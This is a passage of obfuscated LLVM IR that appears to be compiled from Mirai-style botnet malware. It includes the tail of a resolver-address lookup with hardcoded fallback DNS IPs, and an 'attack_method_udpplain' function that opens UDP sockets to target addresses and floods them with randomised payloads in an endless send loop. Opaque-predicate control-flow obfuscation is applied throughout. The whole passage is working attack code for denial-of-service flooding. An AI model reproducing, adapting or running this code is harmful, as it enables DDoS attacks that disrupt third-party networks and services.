  %49 = icmp slt i32 %47, %48
  br i1 %49, label %50, label %151

; <label>:50:                                     ; preds = %46
  %51 = load i32, i32* %6, align 4
  %52 = sext i32 %51 to i64
  %53 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i64 0, i64 %52
  %54 = load i8, i8* %53, align 1
  store i8 %54, i8* %10, align 1
  %55 = load i8, i8* %8, align 1
  %56 = icmp ne i8 %55, 0
  br i1 %56, label %68, label %57

; <label>:57:                                     ; preds = %50
  %58 = load i8, i8* %10, align 1
  %59 = sext i8 %58 to i32
  %60 = icmp eq i32 %59, 32
  br i1 %60, label %65, label %61

; <label>:61:                                     ; preds = %57
  %62 = load i8, i8* %10, align 1
  %63 = sext i8 %62 to i32
  %64 = icmp eq i32 %63, 9
  br i1 %64, label %65, label %66

; <label>:65:                                     ; preds = %61, %57
  br label %132

; <label>:66:                                     ; preds = %61
  store i8 1, i8* %8, align 1
  br label %67

; <label>:67:                                     ; preds = %66
  br label %68

; <label>:68:                                     ; preds = %67, %50
  %69 = load i32, i32* @x.39
  %70 = load i32, i32* @y.40
  %71 = sub i32 %69, 1
  %72 = mul i32 %69, %71
  %73 = urem i32 %72, 2
  %74 = icmp eq i32 %73, 0
  %75 = icmp slt i32 %70, 10
  %76 = or i1 %74, %75
  br i1 %76, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %68
  %77 = load i8, i8* %10, align 1
  %78 = sext i8 %77 to i32
  %79 = icmp ne i32 %78, 46
  %80 = load i32, i32* @x.39
  %81 = load i32, i32* @y.40
  %82 = sub i32 %80, 1
  %83 = mul i32 %80, %82
  %84 = urem i32 %83, 2
  %85 = icmp eq i32 %84, 0
  %86 = icmp slt i32 %81, 10
  %87 = or i1 %85, %86
  br i1 %87, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %79, label %88, label %96

; <label>:88:                                     ; preds = %originalBBpart24
  %89 = load i8, i8* %10, align 1
  %90 = sext i8 %89 to i32
  %91 = icmp slt i32 %90, 48
  br i1 %91, label %101, label %92

; <label>:92:                                     ; preds = %88
  %93 = load i8, i8* %10, align 1
  %94 = sext i8 %93 to i32
  %95 = icmp sgt i32 %94, 57
  br i1 %95, label %101, label %96

; <label>:96:                                     ; preds = %92, %originalBBpart24
  %97 = load i32, i32* %6, align 4
  %98 = load i32, i32* %3, align 4
  %99 = sub nsw i32 %98, 1
  %100 = icmp eq i32 %97, %99
  br i1 %100, label %101, label %131

; <label>:101:                                    ; preds = %96, %92, %88
  %102 = load i32, i32* @x.39
  %103 = load i32, i32* @y.40
  %104 = sub i32 %102, 1
  %105 = mul i32 %102, %104
  %106 = urem i32 %105, 2
  %107 = icmp eq i32 %106, 0
  %108 = icmp slt i32 %103, 10
  %109 = or i1 %107, %108
  br i1 %109, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %101
  %110 = getelementptr inbounds [32 x i8], [32 x i8]* %7, i32 0, i32 0
  %111 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i32 0, i32 0
  %112 = load i32, i32* %4, align 4
  %113 = sext i32 %112 to i64
  %114 = getelementptr inbounds i8, i8* %111, i64 %113
  %115 = load i32, i32* %6, align 4
  %116 = load i32, i32* %4, align 4
  %117 = sub nsw i32 %115, %116
  call void @util_memcpy(i8* %110, i8* %114, i32 %117)
  %118 = load i32, i32* %6, align 4
  %119 = load i32, i32* %4, align 4
  %120 = sub nsw i32 %118, %119
  %121 = sext i32 %120 to i64
  %122 = getelementptr inbounds [32 x i8], [32 x i8]* %7, i64 0, i64 %121
  store i8 0, i8* %122, align 1
  store i8 1, i8* %9, align 1
  %123 = load i32, i32* @x.39
  %124 = load i32, i32* @y.40
  %125 = sub i32 %123, 1
  %126 = mul i32 %123, %125
  %127 = urem i32 %126, 2
  %128 = icmp eq i32 %127, 0
  %129 = icmp slt i32 %124, 10
  %130 = or i1 %128, %129
  br i1 %130, label %originalBBpart215, label %originalBB6alteredBB

originalBBpart215:                                ; preds = %originalBB6
  br label %151

; <label>:131:                                    ; preds = %96
  br label %132

; <label>:132:                                    ; preds = %131, %65
  %133 = load i32, i32* @x.39
  %134 = load i32, i32* @y.40
  %135 = sub i32 %133, 1
  %136 = mul i32 %133, %135
  %137 = urem i32 %136, 2
  %138 = icmp eq i32 %137, 0
  %139 = icmp slt i32 %134, 10
  %140 = or i1 %138, %139
  br i1 %140, label %originalBB17, label %originalBB17alteredBB

originalBB17:                                     ; preds = %originalBB17alteredBB, %132
  %141 = load i32, i32* %6, align 4
  %142 = add nsw i32 %141, 1
  store i32 %142, i32* %6, align 4
  %143 = load i32, i32* @x.39
  %144 = load i32, i32* @y.40
  %145 = sub i32 %143, 1
  %146 = mul i32 %143, %145
  %147 = urem i32 %146, 2
  %148 = icmp eq i32 %147, 0
  %149 = icmp slt i32 %144, 10
  %150 = or i1 %148, %149
  br i1 %150, label %originalBBpart229, label %originalBB17alteredBB

originalBBpart229:                                ; preds = %originalBB17
  br label %46

; <label>:151:                                    ; preds = %originalBBpart215, %46
  %152 = load i8, i8* %9, align 1
  %153 = icmp ne i8 %152, 0
  br i1 %153, label %154, label %157

; <label>:154:                                    ; preds = %151
  %155 = getelementptr inbounds [32 x i8], [32 x i8]* %7, i32 0, i32 0
  %156 = call i32 @inet_addr(i8* %155) #6
  store i32 %156, i32* %1, align 4
  br label %218

; <label>:157:                                    ; preds = %151
  %158 = load i32, i32* @x.39
  %159 = load i32, i32* @y.40
  %160 = sub i32 %158, 1
  %161 = mul i32 %158, %160
  %162 = urem i32 %161, 2
  %163 = icmp eq i32 %162, 0
  %164 = icmp slt i32 %159, 10
  %165 = or i1 %163, %164
  br i1 %165, label %originalBB31, label %originalBB31alteredBB

originalBB31:                                     ; preds = %originalBB31alteredBB, %157
  %166 = load i32, i32* @x.39
  %167 = load i32, i32* @y.40
  %168 = sub i32 %166, 1
  %169 = mul i32 %166, %168
  %170 = urem i32 %169, 2
  %171 = icmp eq i32 %170, 0
  %172 = icmp slt i32 %167, 10
  %173 = or i1 %171, %172
  br i1 %173, label %originalBBpart233, label %originalBB31alteredBB

originalBBpart233:                                ; preds = %originalBB31
  br label %174

; <label>:174:                                    ; preds = %originalBBpart233, %originalBBpart2
  %175 = load i32, i32* @x.39
  %176 = load i32, i32* @y.40
  %177 = sub i32 %175, 1
  %178 = mul i32 %175, %177
  %179 = urem i32 %178, 2
  %180 = icmp eq i32 %179, 0
  %181 = icmp slt i32 %176, 10
  %182 = or i1 %180, %181
  br i1 %182, label %originalBB35, label %originalBB35alteredBB

originalBB35:                                     ; preds = %originalBB35alteredBB, %174
  %183 = load i32, i32* @x.39
  %184 = load i32, i32* @y.40
  %185 = sub i32 %183, 1
  %186 = mul i32 %183, %185
  %187 = urem i32 %186, 2
  %188 = icmp eq i32 %187, 0
  %189 = icmp slt i32 %184, 10
  %190 = or i1 %188, %189
  br i1 %190, label %originalBBpart237, label %originalBB35alteredBB

originalBBpart237:                                ; preds = %originalBB35
  br label %191

; <label>:191:                                    ; preds = %originalBBpart237, %0
  %192 = call i32 @rand_next()
  %193 = urem i32 %192, 4
  switch i32 %193, label %218 [
    i32 0, label %194
    i32 1, label %196
    i32 2, label %198
    i32 3, label %200
  ]

; <label>:194:                                    ; preds = %191
  %195 = call i32 @htonl(i32 134744072) #7
  store i32 %195, i32* %1, align 4
  br label %218

; <label>:196:                                    ; preds = %191
  %197 = call i32 @htonl(i32 1246898730) #7
  store i32 %197, i32* %1, align 4
  br label %218

; <label>:198:                                    ; preds = %191
  %199 = call i32 @htonl(i32 1074151430) #7
  store i32 %199, i32* %1, align 4
  br label %218

; <label>:200:                                    ; preds = %191
  %201 = load i32, i32* @x.39
  %202 = load i32, i32* @y.40
  %203 = sub i32 %201, 1
  %204 = mul i32 %201, %203
  %205 = urem i32 %204, 2
  %206 = icmp eq i32 %205, 0
  %207 = icmp slt i32 %202, 10
  %208 = or i1 %206, %207
  br i1 %208, label %originalBB39, label %originalBB39alteredBB

originalBB39:                                     ; preds = %originalBB39alteredBB, %200
  %209 = call i32 @htonl(i32 67240450) #7
  store i32 %209, i32* %1, align 4
  %210 = load i32, i32* @x.39
  %211 = load i32, i32* @y.40
  %212 = sub i32 %210, 1
  %213 = mul i32 %210, %212
  %214 = urem i32 %213, 2
  %215 = icmp eq i32 %214, 0
  %216 = icmp slt i32 %211, 10
  %217 = or i1 %215, %216
  br i1 %217, label %originalBBpart241, label %originalBB39alteredBB

originalBBpart241:                                ; preds = %originalBB39
  br label %218

; <label>:218:                                    ; preds = %originalBBpart241, %198, %196, %194, %191, %154
  %219 = load i32, i32* %1, align 4
  ret i32 %219

originalBBalteredBB:                              ; preds = %originalBB, %15
  %220 = load i32, i32* %2, align 4
  %221 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i32 0, i32 0
  %222 = call i64 @read(i32 %220, i8* %221, i64 2048)
  %223 = trunc i64 %222 to i32
  store i32 %223, i32* %3, align 4
  %224 = load i32, i32* %2, align 4
  %225 = call i32 @close(i32 %224)
  call void @table_unlock_val(i8 zeroext 22)
  %226 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i32 0, i32 0
  %227 = load i32, i32* %3, align 4
  %228 = call i8* @table_retrieve_val(i32 22, i32* null)
  %229 = call i32 @util_stristr(i8* %226, i32 %227, i8* %228)
  store i32 %229, i32* %4, align 4
  call void @table_lock_val(i8 zeroext 22)
  %230 = load i32, i32* %4, align 4
  %231 = icmp ne i32 %230, -1
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %68
  %232 = load i8, i8* %10, align 1
  %233 = sext i8 %232 to i32
  %234 = icmp ne i32 %233, 46
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %101
  %235 = getelementptr inbounds [32 x i8], [32 x i8]* %7, i32 0, i32 0
  %236 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i32 0, i32 0
  %237 = load i32, i32* %4, align 4
  %238 = sext i32 %237 to i64
  %239 = getelementptr inbounds i8, i8* %236, i64 %238
  %240 = load i32, i32* %6, align 4
  %241 = load i32, i32* %4, align 4
  %_ = sub i32 0, %240
  %gen = add i32 %_, %241
  %242 = sub nsw i32 %240, %241
  call void @util_memcpy(i8* %235, i8* %239, i32 %242)
  %243 = load i32, i32* %6, align 4
  %244 = load i32, i32* %4, align 4
  %_7 = sub i32 %243, %244
  %gen8 = mul i32 %_7, %244
  %_9 = sub i32 0, %243
  %gen10 = add i32 %_9, %244
  %_11 = shl i32 %243, %244
  %_12 = shl i32 %243, %244
  %_13 = shl i32 %243, %244
  %245 = sub nsw i32 %243, %244
  %246 = sext i32 %245 to i64
  %247 = getelementptr inbounds [32 x i8], [32 x i8]* %7, i64 0, i64 %246
  store i8 0, i8* %247, align 1
  store i8 1, i8* %9, align 1
  br label %originalBB6

originalBB17alteredBB:                            ; preds = %originalBB17, %132
  %248 = load i32, i32* %6, align 4
  %_18 = shl i32 %248, 1
  %_19 = sub i32 0, %248
  %gen20 = add i32 %_19, 1
  %_21 = sub i32 %248, 1
  %gen22 = mul i32 %_21, 1
  %_23 = sub i32 %248, 1
  %gen24 = mul i32 %_23, 1
  %_25 = shl i32 %248, 1
  %_26 = sub i32 0, %248
  %gen27 = add i32 %_26, 1
  %249 = add nsw i32 %248, 1
  store i32 %249, i32* %6, align 4
  br label %originalBB17

originalBB31alteredBB:                            ; preds = %originalBB31, %157
  br label %originalBB31

originalBB35alteredBB:                            ; preds = %originalBB35, %174
  br label %originalBB35

originalBB39alteredBB:                            ; preds = %originalBB39, %200
  %250 = call i32 @htonl(i32 67240450) #7
  store i32 %250, i32* %1, align 4
  br label %originalBB39
}

declare i32 @util_strlen(i8*) #3

declare i32 @open(i8*, i32, ...) #3

declare i64 @read(i32, i8*, i64) #3

declare i32 @util_stristr(i8*, i32, i8*) #3

; Function Attrs: noinline nounwind uwtable
define void @attack_method_udpplain(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = load i32, i32* @x.41
  %6 = load i32, i32* @y.42
  %7 = sub i32 %5, 1
  %8 = mul i32 %5, %7
  %9 = urem i32 %8, 2
  %10 = icmp eq i32 %9, 0
  %11 = icmp slt i32 %6, 10
  %12 = or i1 %10, %11
  br i1 %12, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %4
  %13 = alloca i8, align 1
  %14 = alloca %struct.attack_target*, align 8
  %15 = alloca i8, align 1
  %16 = alloca %struct.attack_option*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i8**, align 8
  %19 = alloca i32*, align 8
  %20 = alloca i16, align 2
  %21 = alloca i16, align 2
  %22 = alloca i16, align 2
  %23 = alloca i8, align 1
  %24 = alloca %struct.sockaddr_in, align 4
  %25 = alloca %struct.iphdr*, align 8
  %26 = alloca %struct.udphdr*, align 8
  %27 = alloca i8*, align 8
  %28 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %29 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %30 = alloca i8*, align 8
  store i8 %0, i8* %13, align 1
  store %struct.attack_target* %1, %struct.attack_target** %14, align 8
  store i8 %2, i8* %15, align 1
  store %struct.attack_option* %3, %struct.attack_option** %16, align 8
  %31 = load i8, i8* %13, align 1
  %32 = zext i8 %31 to i64
  %33 = call noalias i8* @calloc(i64 %32, i64 8) #6
  %34 = bitcast i8* %33 to i8**
  store i8** %34, i8*** %18, align 8
  %35 = load i8, i8* %13, align 1
  %36 = zext i8 %35 to i64
  %37 = call noalias i8* @calloc(i64 %36, i64 4) #6
  %38 = bitcast i8* %37 to i32*
  store i32* %38, i32** %19, align 8
  %39 = load i8, i8* %15, align 1
  %40 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %41 = call i32 @attack_get_opt_int(i8 zeroext %39, %struct.attack_option* %40, i8 zeroext 7, i32 65535)
  %42 = trunc i32 %41 to i16
  store i16 %42, i16* %20, align 2
  %43 = load i8, i8* %15, align 1
  %44 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %45 = call i32 @attack_get_opt_int(i8 zeroext %43, %struct.attack_option* %44, i8 zeroext 6, i32 65535)
  %46 = trunc i32 %45 to i16
  store i16 %46, i16* %21, align 2
  %47 = load i8, i8* %15, align 1
  %48 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %49 = call i32 @attack_get_opt_int(i8 zeroext %47, %struct.attack_option* %48, i8 zeroext 0, i32 512)
  %50 = trunc i32 %49 to i16
  store i16 %50, i16* %22, align 2
  %51 = load i8, i8* %15, align 1
  %52 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %53 = call i32 @attack_get_opt_int(i8 zeroext %51, %struct.attack_option* %52, i8 zeroext 1, i32 1)
  %54 = trunc i32 %53 to i8
  store i8 %54, i8* %23, align 1
  %55 = bitcast %struct.sockaddr_in* %24 to i8*
  call void @llvm.memset.p0i8.i64(i8* %55, i8 0, i64 16, i32 4, i1 false)
  %56 = load i16, i16* %21, align 2
  %57 = zext i16 %56 to i32
  %58 = icmp eq i32 %57, 65535
  %59 = load i32, i32* @x.41
  %60 = load i32, i32* @y.42
  %61 = sub i32 %59, 1
  %62 = mul i32 %59, %61
  %63 = urem i32 %62, 2
  %64 = icmp eq i32 %63, 0
  %65 = icmp slt i32 %60, 10
  %66 = or i1 %64, %65
  br i1 %66, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %58, label %67, label %70

; <label>:67:                                     ; preds = %originalBBpart2
  %68 = call i32 @rand_next()
  %69 = trunc i32 %68 to i16
  store i16 %69, i16* %21, align 2
  br label %73

; <label>:70:                                     ; preds = %originalBBpart2
  %71 = load i16, i16* %21, align 2
  %72 = call zeroext i16 @htons(i16 zeroext %71) #7
  store i16 %72, i16* %21, align 2
  br label %73

; <label>:73:                                     ; preds = %70, %67
  store i32 0, i32* %17, align 4
  br label %74

; <label>:74:                                     ; preds = %234, %73
  %75 = load i32, i32* %17, align 4
  %76 = load i8, i8* %13, align 1
  %77 = zext i8 %76 to i32
  %78 = icmp slt i32 %75, %77
  br i1 %78, label %79, label %237

; <label>:79:                                     ; preds = %74
  %80 = call noalias i8* @calloc(i64 65535, i64 1) #6
  %81 = load i8**, i8*** %18, align 8
  %82 = load i32, i32* %17, align 4
  %83 = sext i32 %82 to i64
  %84 = getelementptr inbounds i8*, i8** %81, i64 %83
  store i8* %80, i8** %84, align 8
  %85 = load i16, i16* %20, align 2
  %86 = zext i16 %85 to i32
  %87 = icmp eq i32 %86, 65535
  br i1 %87, label %88, label %97

; <label>:88:                                     ; preds = %79
  %89 = call i32 @rand_next()
  %90 = trunc i32 %89 to i16
  %91 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %92 = load i32, i32* %17, align 4
  %93 = sext i32 %92 to i64
  %94 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %91, i64 %93
  %95 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %94, i32 0, i32 0
  %96 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %95, i32 0, i32 1
  store i16 %90, i16* %96, align 2
  br label %106

; <label>:97:                                     ; preds = %79
  %98 = load i16, i16* %20, align 2
  %99 = call zeroext i16 @htons(i16 zeroext %98) #7
  %100 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %101 = load i32, i32* %17, align 4
  %102 = sext i32 %101 to i64
  %103 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %100, i64 %102
  %104 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %103, i32 0, i32 0
  %105 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %104, i32 0, i32 1
  store i16 %99, i16* %105, align 2
  br label %106

; <label>:106:                                    ; preds = %97, %88
  %107 = call i32 @socket(i32 2, i32 2, i32 17) #6
  %108 = load i32*, i32** %19, align 8
  %109 = load i32, i32* %17, align 4
  %110 = sext i32 %109 to i64
  %111 = getelementptr inbounds i32, i32* %108, i64 %110
  store i32 %107, i32* %111, align 4
  %112 = icmp eq i32 %107, -1
  br i1 %112, label %113, label %114

; <label>:113:                                    ; preds = %106
  ret void

; <label>:114:                                    ; preds = %106
  %115 = load i32, i32* @x.41
  %116 = load i32, i32* @y.42
  %117 = sub i32 %115, 1
  %118 = mul i32 %115, %117
  %119 = urem i32 %118, 2
  %120 = icmp eq i32 %119, 0
  %121 = icmp slt i32 %116, 10
  %122 = or i1 %120, %121
  br i1 %122, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %114
  %123 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %24, i32 0, i32 0
  store i16 2, i16* %123, align 4
  %124 = load i16, i16* %21, align 2
  %125 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %24, i32 0, i32 1
  store i16 %124, i16* %125, align 2
  %126 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %24, i32 0, i32 2
  %127 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %126, i32 0, i32 0
  store i32 0, i32* %127, align 4
  %128 = load i32*, i32** %19, align 8
  %129 = load i32, i32* %17, align 4
  %130 = sext i32 %129 to i64
  %131 = getelementptr inbounds i32, i32* %128, i64 %130
  %132 = load i32, i32* %131, align 4
  %133 = bitcast %union.__CONST_SOCKADDR_ARG* %28 to %struct.sockaddr**
  %134 = bitcast %struct.sockaddr_in* %24 to %struct.sockaddr*
  store %struct.sockaddr* %134, %struct.sockaddr** %133, align 8
  %135 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %28, i32 0, i32 0
  %136 = load %struct.sockaddr*, %struct.sockaddr** %135, align 8
  %137 = call i32 @bind(i32 %132, %struct.sockaddr* %136, i32 16) #6
  %138 = icmp eq i32 %137, -1
  %139 = load i32, i32* @x.41
  %140 = load i32, i32* @y.42
  %141 = sub i32 %139, 1
  %142 = mul i32 %139, %141
  %143 = urem i32 %142, 2
  %144 = icmp eq i32 %143, 0
  %145 = icmp slt i32 %140, 10
  %146 = or i1 %144, %145
  br i1 %146, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %138, label %147, label %148

; <label>:147:                                    ; preds = %originalBBpart24
  br label %148

; <label>:148:                                    ; preds = %147, %originalBBpart24
  %149 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %150 = load i32, i32* %17, align 4
  %151 = sext i32 %150 to i64
  %152 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %149, i64 %151
  %153 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %152, i32 0, i32 2
  %154 = load i8, i8* %153, align 4
  %155 = zext i8 %154 to i32
  %156 = icmp slt i32 %155, 32
  br i1 %156, label %157, label %199

; <label>:157:                                    ; preds = %148
  %158 = load i32, i32* @x.41
  %159 = load i32, i32* @y.42
  %160 = sub i32 %158, 1
  %161 = mul i32 %158, %160
  %162 = urem i32 %161, 2
  %163 = icmp eq i32 %162, 0
  %164 = icmp slt i32 %159, 10
  %165 = or i1 %163, %164
  br i1 %165, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %157
  %166 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %167 = load i32, i32* %17, align 4
  %168 = sext i32 %167 to i64
  %169 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %166, i64 %168
  %170 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %169, i32 0, i32 1
  %171 = load i32, i32* %170, align 4
  %172 = call i32 @ntohl(i32 %171) #7
  %173 = call i32 @rand_next()
  %174 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %175 = load i32, i32* %17, align 4
  %176 = sext i32 %175 to i64
  %177 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %174, i64 %176
  %178 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %177, i32 0, i32 2
  %179 = load i8, i8* %178, align 4
  %180 = zext i8 %179 to i32
  %181 = lshr i32 %173, %180
  %182 = add i32 %172, %181
  %183 = call i32 @htonl(i32 %182) #7
  %184 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %185 = load i32, i32* %17, align 4
  %186 = sext i32 %185 to i64
  %187 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %184, i64 %186
  %188 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %187, i32 0, i32 0
  %189 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %188, i32 0, i32 2
  %190 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %189, i32 0, i32 0
  store i32 %183, i32* %190, align 4
  %191 = load i32, i32* @x.41
  %192 = load i32, i32* @y.42
  %193 = sub i32 %191, 1
  %194 = mul i32 %191, %193
  %195 = urem i32 %194, 2
  %196 = icmp eq i32 %195, 0
  %197 = icmp slt i32 %192, 10
  %198 = or i1 %196, %197
  br i1 %198, label %originalBBpart217, label %originalBB6alteredBB

originalBBpart217:                                ; preds = %originalBB6
  br label %199

; <label>:199:                                    ; preds = %originalBBpart217, %148
  %200 = load i32, i32* @x.41
  %201 = load i32, i32* @y.42
  %202 = sub i32 %200, 1
  %203 = mul i32 %200, %202
  %204 = urem i32 %203, 2
  %205 = icmp eq i32 %204, 0
  %206 = icmp slt i32 %201, 10
  %207 = or i1 %205, %206
  br i1 %207, label %originalBB19, label %originalBB19alteredBB

originalBB19:                                     ; preds = %originalBB19alteredBB, %199
  %208 = load i32*, i32** %19, align 8
  %209 = load i32, i32* %17, align 4
  %210 = sext i32 %209 to i64
  %211 = getelementptr inbounds i32, i32* %208, i64 %210
  %212 = load i32, i32* %211, align 4
  %213 = bitcast %union.__CONST_SOCKADDR_ARG* %29 to %struct.sockaddr**
  %214 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %215 = load i32, i32* %17, align 4
  %216 = sext i32 %215 to i64
  %217 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %214, i64 %216
  %218 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %217, i32 0, i32 0
  %219 = bitcast %struct.sockaddr_in* %218 to %struct.sockaddr*
  store %struct.sockaddr* %219, %struct.sockaddr** %213, align 8
  %220 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %29, i32 0, i32 0
  %221 = load %struct.sockaddr*, %struct.sockaddr** %220, align 8
  %222 = call i32 @connect(i32 %212, %struct.sockaddr* %221, i32 16)
  %223 = icmp eq i32 %222, -1
  %224 = load i32, i32* @x.41
  %225 = load i32, i32* @y.42
  %226 = sub i32 %224, 1
  %227 = mul i32 %224, %226
  %228 = urem i32 %227, 2
  %229 = icmp eq i32 %228, 0
  %230 = icmp slt i32 %225, 10
  %231 = or i1 %229, %230
  br i1 %231, label %originalBBpart221, label %originalBB19alteredBB

originalBBpart221:                                ; preds = %originalBB19
  br i1 %223, label %232, label %233

; <label>:232:                                    ; preds = %originalBBpart221
  br label %233

; <label>:233:                                    ; preds = %232, %originalBBpart221
  br label %234

; <label>:234:                                    ; preds = %233
  %235 = load i32, i32* %17, align 4
  %236 = add nsw i32 %235, 1
  store i32 %236, i32* %17, align 4
  br label %74

; <label>:237:                                    ; preds = %74
  br label %238

; <label>:238:                                    ; preds = %301, %237
  %239 = load i32, i32* @x.41
  %240 = load i32, i32* @y.42
  %241 = sub i32 %239, 1
  %242 = mul i32 %239, %241
  %243 = urem i32 %242, 2
  %244 = icmp eq i32 %243, 0
  %245 = icmp slt i32 %240, 10
  %246 = or i1 %244, %245
  br i1 %246, label %originalBB23, label %originalBB23alteredBB

originalBB23:                                     ; preds = %originalBB23alteredBB, %238
  store i32 0, i32* %17, align 4
  %247 = load i32, i32* @x.41
  %248 = load i32, i32* @y.42
  %249 = sub i32 %247, 1
  %250 = mul i32 %247, %249
  %251 = urem i32 %250, 2
  %252 = icmp eq i32 %251, 0
  %253 = icmp slt i32 %248, 10
  %254 = or i1 %252, %253
  br i1 %254, label %originalBBpart225, label %originalBB23alteredBB

originalBBpart225:                                ; preds = %originalBB23
  br label %255

; <label>:255:                                    ; preds = %originalBBpart233, %originalBBpart225
  %256 = load i32, i32* %17, align 4
  %257 = load i8, i8* %13, align 1
  %258 = zext i8 %257 to i32
  %259 = icmp slt i32 %256, %258
  br i1 %259, label %260, label %301

; <label>:260:                                    ; preds = %255
  %261 = load i8**, i8*** %18, align 8
  %262 = load i32, i32* %17, align 4
  %263 = sext i32 %262 to i64
  %264 = getelementptr inbounds i8*, i8** %261, i64 %263
  %265 = load i8*, i8** %264, align 8
  store i8* %265, i8** %30, align 8
  %266 = load i8, i8* %23, align 1
  %267 = icmp ne i8 %266, 0
  br i1 %267, label %268, label %272

; <label>:268:                                    ; preds = %260
  %269 = load i8*, i8** %30, align 8
  %270 = load i16, i16* %22, align 2
  %271 = zext i16 %270 to i32
  call void @rand_str(i8* %269, i32 %271)
  br label %272

; <label>:272:                                    ; preds = %268, %260
  %273 = load i32*, i32** %19, align 8
  %274 = load i32, i32* %17, align 4
  %275 = sext i32 %274 to i64
  %276 = getelementptr inbounds i32, i32* %273, i64 %275
  %277 = load i32, i32* %276, align 4
  %278 = load i8*, i8** %30, align 8
  %279 = load i16, i16* %22, align 2
  %280 = zext i16 %279 to i64
  %281 = call i64 @send(i32 %277, i8* %278, i64 %280, i32 16384)
  br label %282

; <label>:282:                                    ; preds = %272
  %283 = load i32, i32* @x.41
  %284 = load i32, i32* @y.42
  %285 = sub i32 %283, 1
  %286 = mul i32 %283, %285
  %287 = urem i32 %286, 2
  %288 = icmp eq i32 %287, 0
  %289 = icmp slt i32 %284, 10
  %290 = or i1 %288, %289
  br i1 %290, label %originalBB27, label %originalBB27alteredBB

originalBB27:                                     ; preds = %originalBB27alteredBB, %282
  %291 = load i32, i32* %17, align 4
  %292 = add nsw i32 %291, 1
  store i32 %292, i32* %17, align 4
  %293 = load i32, i32* @x.41
  %294 = load i32, i32* @y.42
  %295 = sub i32 %293, 1
  %296 = mul i32 %293, %295
  %297 = urem i32 %296, 2
  %298 = icmp eq i32 %297, 0
  %299 = icmp slt i32 %294, 10
  %300 = or i1 %298, %299
  br i1 %300, label %originalBBpart233, label %originalBB27alteredBB

originalBBpart233:                                ; preds = %originalBB27
  br label %255

; <label>:301:                                    ; preds = %255
  br label %238

originalBBalteredBB:                              ; preds = %originalBB, %4
  %302 = alloca i8, align 1
  %303 = alloca %struct.attack_target*, align 8
  %304 = alloca i8, align 1
  %305 = alloca %struct.attack_option*, align 8
  %306 = alloca i32, align 4
  %307 = alloca i8**, align 8
  %308 = alloca i32*, align 8
  %309 = alloca i16, align 2
  %310 = alloca i16, align 2
  %311 = alloca i16, align 2
  %312 = alloca i8, align 1
  %313 = alloca %struct.sockaddr_in, align 4
  %314 = alloca %struct.iphdr*, align 8
  %315 = alloca %struct.udphdr*, align 8
  %316 = alloca i8*, align 8
  %317 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %318 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %319 = alloca i8*, align 8
  store i8 %0, i8* %302, align 1
  store %struct.attack_target* %1, %struct.attack_target** %303, align 8
  store i8 %2, i8* %304, align 1
  store %struct.attack_option* %3, %struct.attack_option** %305, align 8
  %320 = load i8, i8* %302, align 1
  %321 = zext i8 %320 to i64
  %322 = call noalias i8* @calloc(i64 %321, i64 8) #6
  %323 = bitcast i8* %322 to i8**
  store i8** %323, i8*** %307, align 8
  %324 = load i8, i8* %302, align 1
  %325 = zext i8 %324 to i64
  %326 = call noalias i8* @calloc(i64 %325, i64 4) #6
